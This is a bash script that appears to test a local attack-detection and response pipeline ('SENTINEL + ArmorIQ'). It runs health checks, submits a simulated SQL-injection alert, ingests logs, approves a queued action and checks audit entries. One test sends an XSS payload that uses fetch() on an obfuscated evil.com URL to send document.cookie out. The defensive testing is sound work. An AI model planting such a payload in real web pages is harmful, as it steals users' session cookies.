#!/bin/bash
# SENTINEL + ArmorIQ — Quick curl test (fixed)
# Usage: bash scripts/simulate_attack.sh

GATEWAY="http://localhost:3000"
ARMORIQ="http://localhost:8004"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

echo
echo -e "${BOLD}══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  SENTINEL + ArmorIQ Quick Test${NC}"
echo -e "${BOLD}══════════════════════════════════════════════════════════${NC}"

# ── Test 1: ArmorIQ Health ───────────────────────────────────────────────────
echo
echo -e "${YELLOW}[TEST 1]${NC} ArmorIQ health check"
RESPONSE=$(curl -s "${ARMORIQ}/health")
if echo "$RESPONSE" | grep -q '"status":"ok"'; then
  echo -e "  ${GREEN}✓${NC} ArmorIQ is online"
else
  echo -e "  ${RED}✗${NC} ArmorIQ is OFFLINE. Start: cd services/armoriq-agent && uvicorn main:app --port 8004 --reload"
  exit 1
fi

# ── Test 2: Critical SQLi via ArmorIQ directly ─────────────────────────────
echo
echo -e "${YELLOW}[TEST 2]${NC} Critical SQLi → BLOCK shutdown_endpoint + permanent_ban"
RESPONSE=$(curl -s -X POST "${ARMORIQ}/respond" \
  -H "Content-Type: application/json" \
  -d '{"attackId":"507f1f77bcf86cd799439011","ip":"192.168.5.22","attackType":"sqli","severity":"critical","status":"successful","confidence":0.97}')
echo "$RESPONSE" | python3 -m json.tool 2>/dev/null || echo "$RESPONSE"

# ── Test 3: Full pipeline via Gateway (triggers Gateway → ArmorIQ) ───────────
echo
echo -e "${YELLOW}[TEST 3]${NC} Full pipeline: Gateway ingest → Detection → ArmorIQ (critical XSS)"
RESPONSE=$(curl -s -X POST "${GATEWAY}/api/logs/ingest" \
  -H "Content-Type: application/json" \
  -d '{
    "projectId": "test-demo",
    "method": "POST",
    "url": "/search",
    "ip": "10.10.10.99",
    "queryParams": {},
    "body": {"q": "<script>fetch(atob(\"aHR0cHM6Ly9ldmlsLmNvbQ=="+\"/steal?c=\"+document.cookie)</script>"},
    "headers": {"userAgent": "Mozilla/5.0", "contentType": "application/json", "referer": ""},
    "responseCode": 200
  }')
echo -e "  ${CYAN}Gateway:${NC}"
echo "$RESPONSE" | python3 -m json.tool 2>/dev/null || echo "$RESPONSE"
echo -e "  ${CYAN}Waiting 2s for ArmorIQ to write to DB...${NC}"
sleep 2

# ── Test 4: Verify action_queue ───────────────────────────────────────────────
echo
echo -e "${YELLOW}[TEST 4]${NC} Check action_queue (should have pending items from Test 3)"
PENDING=$(curl -s "${GATEWAY}/api/actions/pending")
COUNT=$(echo "$PENDING" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('data',[])))" 2>/dev/null)
echo "$PENDING" | python3 -m json.tool 2>/dev/null || echo "$PENDING"
if [ "$COUNT" -gt 0 ] 2>/dev/null; then
  echo -e "  ${GREEN}✓ $COUNT pending action(s) found in action_queue${NC}"
  # Extract first pending ID for approve demo
  FIRST_ID=$(echo "$PENDING" | python3 -c "import sys,json; d=json.load(sys.stdin); items=d.get('data',[]); print(items[0]['_id'] if items else '')" 2>/dev/null)
  if [ -n "$FIRST_ID" ]; then
    echo -e "  ${CYAN}First pending ID:${NC} $FIRST_ID"
    echo
    echo -e "${YELLOW}[TEST 5]${NC} Approving first pending action (human override demo)"
    APPROVE=$(curl -s -X POST "${GATEWAY}/api/actions/${FIRST_ID}/approve" \
      -H "Content-Type: application/json" \
      -d '{"approvedBy": "judge"}')
    echo "$APPROVE" | python3 -m json.tool 2>/dev/null || echo "$APPROVE"
    echo -e "  ${GREEN}✓ Approved — check /audit for APPROVED entry${NC}"
  fi
else
  echo -e "  ${YELLOW}⚠ action_queue is empty${NC}"
  echo -e "  This means Gateway did not receive detection results."
  echo -e "  Check if Detection Engine is running: curl http://localhost:8002/health"
fi

# ── Test 5 (or 6): Verify audit log ───────────────────────────────────────────
echo
echo -e "${YELLOW}[TEST 6]${NC} Check audit log (ALLOWED + BLOCKED entries)"
AUDIT=$(curl -s "${GATEWAY}/api/audit")
AUDIT_COUNT=$(echo "$AUDIT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('data',[])))" 2>/dev/null)
echo "$AUDIT" | python3 -m json.tool 2>/dev/null || echo "$AUDIT"
if [ "$AUDIT_COUNT" -gt 0 ] 2>/dev/null; then
  echo -e "  ${GREEN}✓ $AUDIT_COUNT audit entries found${NC}"
else
  echo -e "  ${YELLOW}⚠ Audit log is empty — restarting ArmorIQ applies the fix${NC}"
fi

# ── Direct audit ingest test (bypasses ArmorIQ, verifies Gateway endpoint) ───
echo
echo -e "${YELLOW}[TEST 7]${NC} Direct audit ingest test (verify Gateway /api/audit/ingest)"
AUDIT_RESP=$(curl -s -X POST "${GATEWAY}/api/audit/ingest" \
  -H "Content-Type: application/json" \
  -d '{
    "intent_id": "test-intent-001",
    "action": "shutdown_endpoint",
    "status": "BLOCKED",
    "reason": "Action requires human authorization",
    "policy_rule_id": "RULE_001",
    "triggeredBy": "agent",
    "ip": "192.168.5.22",
    "attackId": "507f1f77bcf86cd799439011",
    "meta": {"attackType": "sqli", "severity": "critical"}
  }')
echo "$AUDIT_RESP" | python3 -m json.tool 2>/dev/null || echo "$AUDIT_RESP"
if echo "$AUDIT_RESP" | grep -q '"success":true'; then
  echo -e "  ${GREEN}✓ Direct audit ingest works — Gateway /api/audit/ingest is healthy${NC}"
else
  echo -e "  ${RED}✗ Direct audit ingest FAILED — check Gateway logs${NC}"
fi

# ── Summary ────────────────────────────────────────────────────────────
echo
echo -e "${BOLD}══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  Dashboard links:${NC}"
echo -e "${BOLD}══════════════════════════════════════════════════════════${NC}"
echo -e "  Action Queue : http://localhost:5173/action-queue"
echo -e "  Audit Log    : http://localhost:5173/audit"
echo -e "  Alerts       : http://localhost:5173/alerts"
echo
